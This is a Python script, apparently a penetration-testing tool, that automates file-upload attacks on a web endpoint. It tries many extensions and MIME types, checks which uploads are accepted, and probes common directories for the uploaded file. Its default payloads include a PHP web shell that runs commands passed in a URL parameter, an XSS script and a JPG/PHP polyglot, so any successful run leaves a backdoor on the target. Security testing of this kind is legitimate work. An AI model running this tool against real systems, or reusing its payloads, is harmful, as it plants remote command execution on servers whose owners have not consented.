import argparse
import requests
from pathlib import Path
from tqdm import tqdm
import time
import csv
import json
from urllib.parse import urljoin

# a list of common directories of files, where files may be stored
COMMON_UPLOAD_PATHS = ["/uploads/", "/upload/", "/files/", "/assets/", "/data/"]

# function that fetches and extracts information from the web server, useful info for the tester
def detect_server_headers(resp):
    return {
        "Server": resp.headers.get("Server", "Unknown"),
        "X-Powered-By": resp.headers.get("X-Powered-By", "Unknown"),
        "Content-Type": resp.headers.get("Content-Type", "Unknown")
    }

# function that verifies if an uploaded file can be accessed from a url
def try_locate_upload(base_url, filename):
    for path in COMMON_UPLOAD_PATHS:
        test_url = urljoin(base_url, path + filename)
        try:
            resp = requests.get(test_url, timeout=6)
            if resp.status_code == 200 and len(resp.content) > 0:
                return test_url
        except Exception:
            continue
    return None

# function that is at the core logic for a single upload attempt, where a file is made and uploaded, and tracks if it was successful or a failure
def test_upload(url, field, filename, content, ext, fail_strings, extra_data, headers, retries=3):
    fname = f"{filename}.{ext}"
    mime_type = "application/octet-stream"
    if ext in ["jpg", "jpeg", "png"]: mime_type = "image/jpeg"
    elif ext == "php": mime_type = "application/x-httpd-php"
    elif ext == "html": mime_type = "text/html"

    files = {field: (fname, content, mime_type)}
    data = extra_data.copy()

    for attempt in range(retries):
        try:
            resp = requests.post(url, files=files, data=data, headers=headers, timeout=12)
            server_info = detect_server_headers(resp)
            for fail in fail_strings:
                if fail.lower() in resp.text.lower():
                    return False, resp.status_code, fname, resp.text[:180], server_info, None
            if 200 <= resp.status_code < 400:
                loc = try_locate_upload(url, fname)
                return True, resp.status_code, fname, resp.text[:180], server_info, loc
        except Exception:
            time.sleep(2 ** attempt)
    return False, -1, fname, "Error or timeout", {}, None

# automates the uploading process to create tests that tracks the successes and failures
def run_upload_tests(url, field, payloads, exts, fail_strings, extra_data, headers):
    results = []
    for ext in tqdm(exts, desc="Testing extensions"):
        for content in payloads:
            ok, status, fname, snippet, server_info, found_url = test_upload(
                url, field, "test_upload", content, ext,
                fail_strings, extra_data, headers
            )
            result = {
                "file": fname,
                "extension": ext,
                "status_code": status,
                "result": "Possible Success" if ok else "Rejected",
                "preview": snippet.strip().replace('\n', ' ')[:90],
                "server": server_info,
                "found_url": found_url or "N/A"
            }
            if ok:
                print(f"|!| Upload possibly allowed: {fname} (Status: {status}) -> {found_url or 'Unknown location'}")
            results.append(result)
    return results

# functions which allows results to be saved into either json or csv formats
def save_results_csv(results, path):
    keys = ["file", "extension", "status_code", "result", "preview", "server", "found_url"]
    with open(path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=keys)
        writer.writeheader()
        for row in results:
            row["server"] = str(row["server"])  # flatten dict for CSV
            writer.writerow(row)

def save_results_json(results, path):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2)

# arg parser for cli customizability
def cli():
    parser = argparse.ArgumentParser(description="Advanced File Upload Vulnerability Tester")
    parser.add_argument("url", help="Upload endpoint (e.g., http://example.com/upload)")
    parser.add_argument("--field", default="file", help="File form field name (default: file)")
    parser.add_argument("-p", "--payloads", nargs="+", default=[
        "<?php echo 123;?>",
        "<?php system($_GET['cmd']); ?>",
        "<script>alert(1)</script>",
        b'\xff\xd8\xff<?php echo "jpg"; ?>'  # Polyglot JPG/PHP
    ], help="Upload payloads")
    parser.add_argument("-e", "--exts", nargs="+", default=["php", "png", "jpg", "html", "asp", "phtml"], help="Extensions to try")
    parser.add_argument("--fail", nargs="*", default=["invalid", "not allowed", "error", "forbidden"], help="Failure indicators in response")
    parser.add_argument("--extra", nargs="*", default=[], help="Extra form data key=val")
    parser.add_argument("--header", nargs="*", default=[], help="Custom headers (Key:Value)")
    parser.add_argument("--csv-out", help="Save results to CSV file")
    parser.add_argument("--json-out", help="Save results to JSON file")
    args = parser.parse_args()

    extra_data = {item.split("=", 1)[0]: item.split("=", 1)[1] for item in args.extra if "=" in item}
    headers = {item.split(":", 1)[0]: item.split(":", 1)[1] for item in args.header if ":" in item}

    payloads = [bytes(x, "utf-8") if isinstance(x, str) else x for x in args.payloads]

    print("|*| Starting file upload vulnerability scan...")
    results = run_upload_tests(args.url, args.field, payloads, args.exts, args.fail, extra_data, headers)

    if args.csv_out:
        save_results_csv(results, args.csv_out)
        print(f"|+| Results saved to {args.csv_out}")
    if args.json_out:
        save_results_json(results, args.json_out)
        print(f"|+| Results saved to {args.json_out}")

if __name__ == "__main__":
    cli()
